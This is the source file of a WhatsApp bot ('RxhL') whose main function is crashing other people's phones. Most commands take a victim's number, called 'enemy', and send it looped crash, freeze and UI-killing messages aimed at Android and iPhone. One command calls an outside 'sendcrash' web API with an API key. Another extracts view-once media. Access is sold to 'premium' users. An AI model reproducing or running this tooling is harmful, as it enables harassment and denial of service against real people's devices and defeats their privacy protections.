require("./RxhlOfc/helconfig")
const {
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    downloadContentFromMessage,
    generateWAMessageContent,
    proto
} = require('@whiskeysockets/baileys')
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const moment = require('moment');
const {
    exec
} = require("child_process")
const chalk = require('chalk')
const {
    smsg,
    isUrl,
    runtime,
    generateMessageTag,
    getBuffer,
    getSizeMedia,
    fetchJson,
    await,
    sleep
} = require('./RxhlOfc/helfunc')
const {
    displayMenuAll,
    displayResponeDoneBug
} = require('./RxhlOfc/heldisplay')
const {
    crashMsgCall,
    kamuflaseFreeze,
    systemUi,
    freezeInDocument,
    travaIos,
    travaIosKill,
    KillIosBlank,
    carouselCrashMsg,
    callXgalaxy,
    GalaxyInDocument,
    FreezeInLocation,
    iosaph,
    program
} = require('./RxhlOfc/helplugins')

module.exports = rxhl = async (rxhl, m, chatUpdate, store) => {
    try {
        var body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "messageContextInfo" ?
            m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
            m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
            m.text :
            ""
        );
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
        const isCmd = body.startsWith(prefix);
        const args = body.trim().split(/ +/).slice(1)
        const text = q = args.join(" ")
        const sender = m.key.fromMe ? (rxhl.user.id.split(':')[0] + '@s.whatsapp.net' || rxhl.user.id) : (m.key.participant || m.key.remoteJid)
        const botNumber = await rxhl.decodeJid(rxhl.user.id)
        const senderNumber = sender.split('@')[0]
        const pushname = m.pushName || `${senderNumber}`
        const isBot = botNumber.includes(senderNumber)
        const from = m.chat
        const content = JSON.stringify(m.message)
        const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")

        // Perizinan
        const owner = JSON.parse(fs.readFileSync('./RxhlOfc/helown.json'));
        const murbug = JSON.parse(fs.readFileSync('./RxhlOfc/helmurbug.json'));
        const cooldowns = JSON.parse(fs.readFileSync('./RxhlOfc/helcd.json'));
        const isOwnNum = (m && m?.sender && [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m?.sender)) || false;
        const isMurbugNum = (m && m?.sender && [botNumber, ...murbug].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m?.sender)) || false;
        const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
        const COOLDOWN_TIME = 480000
        const COOLDOWN_TIME2 = 900000


        // Fungsi untuk mengecek apakah user dalam cooldown


        async function isInCooldown(userId) {
            if (!rxhl.autocd) return console.log("Cooldown dinonaktifkan")
            let user = cooldowns.find((u) => u.numwa === userId);
            if (!user) {
                await setCooldown(userId, COOLDOWN_TIME / 1000); // Setel cooldown jika tidak ada
                return false;
            }

            let currentDate = moment();
            let expiryDate = moment(user.expiry);
            return currentDate.isBefore(expiryDate);
        }

        async function setCooldown(userId, seconds) {
            let expiryDate = moment().add(seconds, 'seconds');

            let userIndex = cooldowns.findIndex((u) => u.numwa === userId);
            if (userIndex !== -1) {
                cooldowns[userIndex].expiry = expiryDate.format();
                console.log('Pengguna telah cooldown');
            } else {
                cooldowns.push({
                    numwa: userId,
                    expiry: expiryDate.format()
                });
                console.log('User baru ditambahkan dalam daftar cooldown');
            }
            fs.writeFileSync('./RxhlOfc/helcd.json', JSON.stringify(cooldowns));
        }

        async function calculateCooldownTime(numwaValue) {
            let getTime = await getExpiryByNumwa(numwaValue);

            if (getTime === "numwa tidak ditemukan") {
                return getTime;
            }

            let date = new Date(getTime);
            let formattedWibTime = date.toLocaleString("id-ID", {
                timeZone: "Asia/Jakarta",
                year: "numeric",
                month: "2-digit",
                day: "2-digit",
                hour: "2-digit",
                minute: "2-digit",
                second: "2-digit"
            });

            return formattedWibTime;
        }

        async function getExpiryByNumwa(numwaValue) {
            let result = cooldowns.find(item => item.numwa === numwaValue);
            return result ? result.expiry : "numwa tidak ditemukan";
        }


        // Function Owner
        async function handleCleanupSessions() {
            await m.reply(`*Sedang menghapus cache pada bot*`);

            fs.readdir("./RxhlOfc/session", async function(err, files) {
                if (err) {
                    console.log('Tidak dapat memindai direktori: ' + err);
                    return m.reply('Tidak dapat memindai direktori: ' + err);
                }


                let filteredArray = files.filter(item =>
                    item.startsWith("pre-key") ||
                    item.startsWith("sender-key") ||
                    item.startsWith("session-") ||
                    item.startsWith("app-state")
                );

                console.log(filteredArray.length);

                let teks = `🚩 Terdeteksi ${filteredArray.length} file sampah\n\n`;


                if (filteredArray.length === 0) {
                    return m.reply(teks);
                }


                filteredArray.forEach(function(file, i) {
                    teks += (i + 1) + `. ${file}\n`;
                });


                await m.reply(teks);
                await m.reply("Menghapus file sampah...");


                filteredArray.forEach(function(file) {
                    fs.unlinkSync(`./RxhlOfc/session/${file}`);
                });


                await m.reply("🚩 Berhasil menghapus semua sampah di folder session");
            });
        }

        // Import C.js
        if (!rxhl.publicqiys) {
            if (!botNumber) return
        }

        // Pick Random
        const pickRandom = (arr) => {
            return arr[Math.floor(Math.random() * arr.length)]
        }

        // Import Function Bug


        // Gambar 
        function RandomImageRxhLMenu() {
            let imageL = pickRandom(global.imagemenu)
            let clearL = {
                url: imageL
            }
            return clearL
        }

        // Next Security
        // Console Log
        if (command) {
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(body || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        const Spinnies = require('spinnies');

        const spinnies = new Spinnies();
        spinnies.add('spinner3', {
            text: 'Menunggu Pesan...',
            color: 'yellow'
        });

        // Pesan Reply
        const nonumber = `\nExample: ${prefix + command} 62821627182`
        // Loading
        async function loadinghel(target, type) {
            let rxhlloading = [
                `_Target:_ *${target}*`,
                `_Type Bug:_ *${type}*`,
                `*Sukses Mengirim Bug 😼*`
            ]
            let {
                key
            } = await rxhl.sendMessage(from, {
                text: 'Proces Bro 😼'
            })
            await sleep(200)
            for (let i = 0; i < rxhlloading.length; i++) {
                await rxhl.sendMessage(from, {
                    text: rxhlloading[i],
                    edit: key
                });
                await sleep(500)
            }
        }

        // Function Other
        async function downloadVideo(url) {
            try {
                let {
                    alldl
                } = require('rahad-all-downloader');
                let result = await alldl(url);
                let anu = result.data.videoUrl
                let anulg = anu.toString()
                await rxhl.sendMessage(from, {
                    video: {
                        url: anulg
                    },
                    caption: "sukses",
                    mimetype: "video/mp4"
                }, {
                    quoted: m
                })
            } catch (error) {
                console.error('Error:', error.message);
            }
        }




        switch (command) {
            case "menu":
            case "help": {
               
                totalrun = runtime(process.uptime())
                ewe = await displayMenuAll(pushname, totalrun)
                rxhl.sendImageWithCaption(from, ewe, RandomImageRxhLMenu(), m)
            }
            break
			case 'msgx': {
			
				if (!m.quoted) return m.reply(`Silakan Quote Sebuah Pesan Untuk Menggunakan Perintah Ini.`);
				const jsonResponse = JSON.stringify({
					[m.quoted.mtype]: m.quoted
				}, null, 2);
				m.reply(jsonResponse);
			}
			break
                case 'rvo': {
			
				if (!isQuotedViewOnce) return m.reply("Reply view once")
				let type = Object.keys(m.quoted.message)[0]
				let quotedType = m.quoted.message[type]
				let media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
				let buffer = Buffer.from([])
				for await (const chunk of media) {
					buffer = Buffer.concat([buffer, chunk])
				}
				if (type == "videoMessage") {
					await rxhl.sendMessage(m.chat, {
						video: buffer,
						caption: quotedType.caption
					})
				} else if (type == "imageMessage") {
					await rxhl.sendMessage(m.chat, {
						image: buffer,
						caption: quotedType.caption
					})
				}
			}
			break
			
            // Murbug Menu
            case 'invcrash0': {
               
                if (!isMurbugNum) return m.reply(global.falown)
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim()
                try {
                    let resdone = await displayResponeDoneBug(enemy, command)
                    let response = await axios.get(`https://venomweb.site/i/sendcrash?numero=${enemy}&total=10&apikey=OUf6oHBKRA`)
                    rxhl.sendImageWithCaption(from, resdone, RandomImageRxhLMenu(), m)
                } catch (err) {
                    m.reply("Terjadi kesalahan")
                    console.log(err)
                }
            }
            break
            case 'requestcall0':
            case 'tocrash0': {
                let waktuCd = await calculateCooldownTime(from)
               
                if (!isMurbugNum) return m.reply(global.falown)
                if (!m.isGroup) return m.reply(global.falgrup)
                if (await isInCooldown(from)) return m.reply(`Cooldown aktif, cooldown akan berakhir pada waktu ${waktuCd}`);
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
                let resdone = await displayResponeDoneBug(enemy, command)
                await rxhl.sendImageWithCaption(from, resdone, RandomImageRxhLMenu(), m)
                if (rxhl.autocd) {
                    await setCooldown(m.chat, COOLDOWN_TIME / 1000)
                } else {
                    await console.log("Cooldown dinonaktifkan")
                }
                for (let i = 0; i < 8; i++) {
                    await crashMsgCall(rxhl, enemy)
                    await crashMsgCall(rxhl, enemy)
                    await sleep(2000)
                }
            }
            break
            case 'specialbug': {
                let waktuCd = await calculateCooldownTime(from)
               
                if (!isMurbugNum) return m.reply(global.falown)
                if (!m.isGroup) return m.reply(global.falgrup)
                if (await isInCooldown(from)) return m.reply(`Cooldown aktif, cooldown akan berakhir pada waktu ${waktuCd}`);
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
                let resdone = await displayResponeDoneBug(enemy, command)
                await rxhl.sendImageWithCaption(from, resdone, RandomImageRxhLMenu(), m)
                if (rxhl.autocd) {
                    await setCooldown(m.chat, COOLDOWN_TIME / 1000)
                } else {
                    await console.log("Cooldown dinonaktifkan")
                }
                for (let i = 0; i < 8; i++) {
                    await freezeInDocument(rxhl, enemy)
                    await freezeInDocument(rxhl, enemy)
                    await sleep(2000)
                }
            }
            break
            case 'outwaori': {
                let waktuCd = await calculateCooldownTime(from)
               
                if (!isMurbugNum) return m.reply(global.falown)
                if (!m.isGroup) return m.reply(global.falgrup)
                if (await isInCooldown(from)) return m.reply(`Cooldown aktif, cooldown akan berakhir pada waktu ${waktuCd}`);
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
                let resdone = await displayResponeDoneBug(enemy, command)
                await rxhl.sendImageWithCaption(from, resdone, RandomImageRxhLMenu(), m)
                if (rxhl.autocd) {
                    await setCooldown(m.chat, COOLDOWN_TIME / 1000)
                } else {
                    await console.log("Cooldown dinonaktifkan")
                }
                for (let i = 0; i < 8; i++) {
                    await carouselCrashMsg(rxhl, enemy)
                    await carouselCrashMsg(rxhl, enemy)
                    await sleep(1000)
                }
                for (let i = 0; i < 3; i++) {
                    await crashMsgCall(rxhl, enemy)
                    await crashMsgCall(rxhl, enemy)
                    await sleep(2000)
                }
            }
            break
            case 'outoffmemory': {
                let waktuCd = await calculateCooldownTime(from)
               
                if (!isMurbugNum) return m.reply(global.falown)
                if (!m.isGroup) return m.reply(global.falgrup)
                if (await isInCooldown(from)) return m.reply(`Cooldown aktif, cooldown akan berakhir pada waktu ${waktuCd}`);
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
                let resdone = await displayResponeDoneBug(enemy, command)
                await rxhl.sendImageWithCaption(from, resdone, RandomImageRxhLMenu(), m)
                if (rxhl.autocd) {
                    await setCooldown(m.chat, COOLDOWN_TIME / 1000)
                } else {
                    await console.log("Cooldown dinonaktifkan")
                }
                for (let i = 0; i < 8; i++) {
                    await kamuflaseFreeze(rxhl, enemy)
                    await kamuflaseFreeze(rxhl, enemy)
                    await sleep(1000)
                }
                for (let i = 0; i < 3; i++) {
                    await crashMsgCall(rxhl, enemy)
                    await crashMsgCall(rxhl, enemy)
                    await sleep(2000)
                }
            }
            break
            case 'getcrashar': {
                let waktuCd = await calculateCooldownTime(from)
               
                if (!isMurbugNum) return m.reply(global.falown)
                if (!m.isGroup) return m.reply(global.falgrup)
                if (await isInCooldown(from)) return m.reply(`Cooldown aktif, cooldown akan berakhir pada waktu ${waktuCd}`);
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
                let resdone = await displayResponeDoneBug(enemy, command)
                await rxhl.sendImageWithCaption(from, resdone, RandomImageRxhLMenu(), m)
                if (rxhl.autocd) {
                    await setCooldown(m.chat, COOLDOWN_TIME / 1000)
                } else {
                    await console.log("Cooldown dinonaktifkan")
                }
                for (let i = 0; i < 8; i++) {
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await sleep(2000)
                }
                for (let i = 0; i < 3; i++) {
                    await crashMsgCall(rxhl, enemy)
                    await crashMsgCall(rxhl, enemy)
                    await sleep(2000)
                }
            }
            break
            case 'combinebug': {
                let waktuCd = await calculateCooldownTime(from)
               
                if (!isMurbugNum) return m.reply(global.falown)
                if (!m.isGroup) return m.reply(global.falgrup)
                if (await isInCooldown(from)) return m.reply(`Cooldown aktif, cooldown akan berakhir pada waktu ${waktuCd}`);
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
                let resdone = await displayResponeDoneBug(enemy, command)
                await rxhl.sendImageWithCaption(from, resdone, RandomImageRxhLMenu(), m)
                if (rxhl.autocd) {
                    await setCooldown(m.chat, COOLDOWN_TIME / 1000)
                } else {
                    await console.log("Cooldown dinonaktifkan")
                }
                for (let i = 0; i < 15; i++) {
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await sleep(2000)
                }
                for (let i = 0; i < 3; i++) {
                    await crashMsgCall(rxhl, enemy)
                    await crashMsgCall(rxhl, enemy)
                    await sleep(2000)
                }
            }
            break
            case 'wakiler': {
                let waktuCd = await calculateCooldownTime(from)
               
                if (!isMurbugNum) return m.reply(global.falown)
                if (!m.isGroup) return m.reply(global.falgrup)
                if (await isInCooldown(from)) return m.reply(`Cooldown aktif, cooldown akan berakhir pada waktu ${waktuCd}`);
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
                let resdone = await displayResponeDoneBug(enemy, command)
                await rxhl.sendImageWithCaption(from, resdone, RandomImageRxhLMenu(), m)
                if (rxhl.autocd) {
                    await setCooldown(m.chat, COOLDOWN_TIME / 1000)
                } else {
                    await console.log("Cooldown dinonaktifkan")
                }
                for (let i = 0; i < 20; i++) {
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await sleep(2000)
                }
                for (let i = 0; i < 3; i++) {
                    await crashMsgCall(rxhl, enemy)
                    await crashMsgCall(rxhl, enemy)
                    await sleep(2000)
                }
            }
            break
            case 'x-uikiller1': {
                let waktuCd = await calculateCooldownTime(from)
               
                if (!isMurbugNum) return m.reply(global.falown)
                if (!m.isGroup) return m.reply(global.falgrup)
                if (await isInCooldown(from)) return m.reply(`Cooldown aktif, cooldown akan berakhir pada waktu ${waktuCd}`);
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
                let resdone = await displayResponeDoneBug(enemy, command)
                await rxhl.sendImageWithCaption(from, resdone, RandomImageRxhLMenu(), m)
                if (rxhl.autocd) {
                    await setCooldown(m.chat, COOLDOWN_TIME / 1000)
                } else {
                    await console.log("Cooldown dinonaktifkan")
                }
                for (let i = 0; i < 30; i++) {
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await sleep(2000)
                }
                for (let i = 0; i < 5; i++) {
                    await crashMsgCall(rxhl, enemy)
                    await crashMsgCall(rxhl, enemy)
                    await sleep(2000)
                }
            }
            break
            case 'x-uikiller2': {
                let waktuCd = await calculateCooldownTime(from)
               
                if (!isMurbugNum) return m.reply(global.falown)
                if (!m.isGroup) return m.reply(global.falgrup)
                if (await isInCooldown(from)) return m.reply(`Cooldown aktif, cooldown akan berakhir pada waktu ${waktuCd}`);
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
                let resdone = await displayResponeDoneBug(enemy, command)
                await rxhl.sendImageWithCaption(from, resdone, RandomImageRxhLMenu(), m)
                if (rxhl.autocd) {
                    await setCooldown(m.chat, COOLDOWN_TIME2 / 1000)
                } else {
                    await console.log("Cooldown dinonaktifkan")
                }
                for (let i = 0; i < 55; i++) {
                    await FreezeInLocation(rxhl, enemy)
                    await FreezeInLocation(rxhl, enemy)
                    await FreezeInLocation(rxhl, enemy)
                    await FreezeInLocation(rxhl, enemy)
                    await sleep(3000)
                }
                await sleep(240000)
                for (let i = 0; i < 10; i++) {
                    await FreezeInLocation(rxhl, enemy)
                    await FreezeInLocation(rxhl, enemy)
                    await FreezeInLocation(rxhl, enemy)
                    await FreezeInLocation(rxhl, enemy)
                    await sleep(2000)
                }
                for (let i = 0; i < 3; i++) {
                    await crashMsgCall(rxhl, enemy)
                    await callXgalaxy(rxhl, enemy)
                    await GalaxyInDocument(rxhl, enemy)
                    await callXgalaxy(rxhl, enemy)
                    await GalaxyInDocument(rxhl, enemy)
                    await crashMsgCall(rxhl, enemy)
                    await sleep(2000)
                }
            }
            break
            case 'brutalkillsystem': {
                let waktuCd = await calculateCooldownTime(from)
               
                if (!isMurbugNum) return m.reply(global.falown)
                if (!m.isGroup) return m.reply(global.falgrup)
                if (await isInCooldown(from)) return m.reply(`Cooldown aktif, cooldown akan berakhir pada waktu ${waktuCd}`);
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
                let resdone = await displayResponeDoneBug(enemy, command)
                await rxhl.sendImageWithCaption(from, resdone, RandomImageRxhLMenu(), m)
                if (rxhl.autocd) {
                    await setCooldown(m.chat, COOLDOWN_TIME2 / 1000)
                } else {
                    await console.log("Cooldown dinonaktifkan")
                }
                for (let i = 0; i < 45; i++) {
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await sleep(3000)
                }
                await sleep(240000)
                for (let i = 0; i < 45; i++) {
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await sleep(4000)
                }
                for (let i = 0; i < 5; i++) {
                    await crashMsgCall(rxhl, enemy)
                    await crashMsgCall(rxhl, enemy)
                    await sleep(8000)
                }
            }
            break
            case 'bugiphone': {
                let waktuCd = await calculateCooldownTime(from)
               
                if (!isMurbugNum) return m.reply(global.falown)
                if (!m.isGroup) return m.reply(global.falgrup)
                if (await isInCooldown(from)) return m.reply(`Cooldown aktif, cooldown akan berakhir pada waktu ${waktuCd}`);
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
                let resdone = await displayResponeDoneBug(enemy, command)
                await rxhl.sendImageWithCaption(from, resdone, RandomImageRxhLMenu(), m)
                if (rxhl.autocd) {
                    await setCooldown(m.chat, COOLDOWN_TIME / 1000)
                } else {
                    await console.log("Cooldown dinonaktifkan")
                }
                for (let i = 0; i < 55; i++) {
                    await iosaph(rxhl, enemy)
                    await travaIos(rxhl, enemy)
                    await iosaph(rxhl, enemy)
                    await travaIos(rxhl, enemy)
                    await sleep(3000)
                }
            }
            break
            case 'typebug0': {
               
                if (!isMurbugNum) return m.reply(global.falown)
                if (!m.isGroup) return m.reply(global.falgrup)
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim()
                let sections = [{
                        title: '⌜ 𝗔𝗻𝗱𝗿𝗼𝗶𝗱 𝗖𝗿𝗮𝘀𝗵 ⌟',
                        rows: [{
                            title: 'Bug 15 Msg',
                            id: `.requestcall ${enemy}`
                        }]
                    },
                    {
                        rows: [{
                            title: 'Freeze Kamuflase',
                            id: `.payfreeze ${enemy}`
                        }]
                    },
                    {
                        rows: [{
                            title: 'Ui Freeze',
                            id: `.hardui ${enemy} `
                        }]
                    },
                    {
                        title: '⌜ 𝗜𝗼𝘀 𝗖𝗿𝗮𝘀𝗵 ⌟',
                        rows: [{
                            title: 'Crash Iphone',
                            id: `.crashiphone ${enemy}`
                        }]
                    }
                ];

                let listMessage = {
                    title: `Select Type Bug`,
                    sections
                };
                rxhl.relayMessage(from, {
                    interactiveMessage: {
                        header: {
                            hasMediaAttachment: false
                        },
                        body: {
                            text: "*_`By RxhL OfficiaL`_*"
                        },
                        carouselMessage: {
                          cards: [{
                            header: {
                                imageMessage: {
                                    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m232/up-oil-image-3c36f0d7-4435-43a2-b447-a3d375e7fab2?ccb=9-4&oh=01_Q5AaIB6EOzt7SJyn-tqKm7EraarWN6YQpHcLKbUS-gj9Bout&oe=674FF504&_nc_sid=e6ed6c&mms3=true",
                                    mimetype: "image/jpeg",
                                    fileSha256: "Z9KgMDKxuV0+vj4L0IZ0DWi5Kagv3vq1H0wCTWaJV9o=",
                                    fileLength: "77946",
                                    height: 736,
                                    width: 736,
                                    mediaKey: "PiyUnbd8YF6jjGudNT4eOYR2qOdB/7xgQWaA0I4am+E=",
                                    fileEncSha256: "QmNIdX7mUEXjR8XYvUISCSUCeLwZR5ppNn+nadeWCtk=",
                                    directPath: "/o1/v/t62.7118-24/f1/m232/up-oil-image-3c36f0d7-4435-43a2-b447-a3d375e7fab2?ccb=9-4&oh=01_Q5AaIB6EOzt7SJyn-tqKm7EraarWN6YQpHcLKbUS-gj9Bout&oe=674FF504&_nc_sid=e6ed6c",
                                    mediaKeyTimestamp: "1730540763",
                                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQADAQAAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAABvflDO2slH2sF6uVKQhdnInjIz0ML1nnJrZKmyOZYicVN+e9lJNNipuqabZaeW2uQtE20c5Lv5y5oSzcqemEN4thB6cydW836onn5qsz6LjTmgIfkAV5m6FS0uCfwAP//EACMQAAICAQQCAwEBAAAAAAAAAAECAAMRBBIhMQVBEyIyYSP/2gAIAQEAAT8AUCAqJZ/ofrCjdYhpJjUZbEuQ1wiGOaqly0bXZcqiQ6q4H8iafV1XcHhoeJtBOcTU1lx1Ca+sSysdieQrLVAiEEYM05NlZBSNXYlmQDE17Bxv6iWVPjawjqI9FbZyOY+nUdR1DoVMsT4bCrDjMpuqqUgSilbCXPRmq0rK7Mo+uZXXehV1Uyt1YZfuWfGDu9x7VPAimavTC5cjuPTfW34MXX3qu2V2W2kBhgTdk7RBXvLAQ6cAcmPWEJIivmAiajlCF7MfTPVYu6EjaAo9T8j+yizY/PuMRLl9iA/2LkjuEZIE8i3xASjWOh2k8RPuMw1g4zC5TjsRrNwzASO4LeJQctkzzXVcHYmnx8axjGOYwmRK13HAiVhRPMLmkGEzR6ndWB7EZyeozY7m4ET/xAAdEQACAgMAAwAAAAAAAAAAAAAAAREhAhAxEiCB/9oACAECAQE/AILRDuSdYskjyV5CWrMYfWdt/DHmoErMsUKtMXp//8QAGREBAAMBAQAAAAAAAAAAAAAAAQAQETEg/9oACAEDAQE/ANnY5ApJk3HkbVOUrWkeQY0dj4//2Q==",
                                    scansSidecar: "rPn3kZUgnn82afuTC8LbGdVD+fTCTRB+BwhO4mgHwMTbl6o6hwBg0g==",
                                    scanLengths: [
                                        6356,
                                        21273,
                                        16088,
                                        34229
                                    ],
                                    midQualityFileSha256: "C2PcN1ZDvo+HoYU293GXY3apAsvL4azoXh8hwL5bIfg="
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "*_`Silahkan pilih bug yang akan dikirim`_*"
                            },
                            nativeFlowMessage: {
                                buttons: [{
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify(listMessage),
                                }],
                                messageParamsJson: ''
                            }
                          }]
                        }
                    }
                }, {}, {
                    messageId: null
                });
            }
            break
            // Owner Bug Menu
            case 'crashwaori': {
               
                if (!isOwnNum) return m.reply(global.falown)
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
                let resdone = await displayResponeDoneBug(enemy, command)
                await rxhl.sendImageWithCaption(from, resdone, RandomImageRxhLMenu(), m)
                for (let i = 0; i < 8; i++) {
                    await crashMsgCall(rxhl, enemy)
                    await crashMsgCall(rxhl, enemy)
                    await sleep(2000)
                }
            }
            break
            case 'notrespondingui': {
               
                if (!isOwnNum) return m.reply(global.falown)
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
                let resdone = await displayResponeDoneBug(enemy, command)
                await rxhl.sendImageWithCaption(from, resdone, RandomImageRxhLMenu(), m)
                for (let i = 0; i < 45; i++) {
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await sleep(3000)
                }
                await sleep(240000)
                for (let i = 0; i < 45; i++) {
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await systemUi(rxhl, enemy)
                    await sleep(4000)
                }
                for (let i = 0; i < 5; i++) {
                    await crashMsgCall(rxhl, enemy)
                    await crashMsgCall(rxhl, enemy)
                    await sleep(8000)
                }
            }
            break
            case 'travaios': {
               
                if (!isMurbugNum) return m.reply(global.falown)
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
                let resdone = await displayResponeDoneBug(enemy, command)
                await rxhl.sendImageWithCaption(from, resdone, RandomImageRxhLMenu(), m)
                for (let i = 0; i < 45; i++) {
                    await travaIosKill(rxhl, enemy)
                    await travaIos(rxhl, enemy)
                    await travaIosKill(rxhl, enemy)
                    await KillIosBlank(rxhl, enemy)
                    await sleep(3000)
                }
            }
            break
            // Owner Menu
            case 'delcache0': {
               
                if (!isOwnNum) return m.reply(global.falown)
                await handleCleanupSessions()
            }
            break
            case 'addowner': {
               
                if (!isOwnNum) return m.reply(global.falown)
                if (!args[0]) return m.reply(`Use ${prefix+command} Number\nExample ${prefix+command} 50663646464`)
                bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
                let ceknye = await rxhl.onWhatsApp(bnnd + `@s.whatsapp.net`)
                if (ceknye.length == 0) return m.reply(`Enter a valid number and register on WhatsApp!!!`)
                owner.push(bnnd)
                murbug.push(bnnd)
                fs.writeFileSync('./RxhlOfc/helown.json', JSON.stringify(owner))
                fs.writeFileSync('./RxhlOfc/helmurbug.json', JSON.stringify(murbug))
                m.reply(`Number ${bnnd} Has Been Added to Premium!!!`)
            }
            break
            case 'deleteowner': {
               
                if (!isOwnNum) return m.reply(global.falown)
                if (!args[0]) return m.reply(`Use ${prefix+command} Number\nExample ${prefix+command} 50663646464`)
                yaki = q.split("|")[0].replace(/[^0-9]/g, '')
                unp = owner.indexOf(yaki)
                anp = murbug.indexOf(yaki)
                owner.splice(unp, 1)
                murbug.splice(anp, 1)
                fs.writeFileSync('./RxhlOfc/helown.json', JSON.stringify(owner))
                fs.writeFileSync('./RxhlOfc/helmurbug.json', JSON.stringify(murbug))
                m.reply(`Number ${yaki} Has Been Removed From Premium!!!`)
            }
            break
            case 'addmurbug': {
               
                if (!isOwnNum) return m.reply(global.falown)
                if (!args[0]) return m.reply(`Use ${prefix+command} Number\nExample ${prefix+command} 50663646464`)
                bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
                let cekkanbre = await rxhl.onWhatsApp(bnnd + `@s.whatsapp.net`)
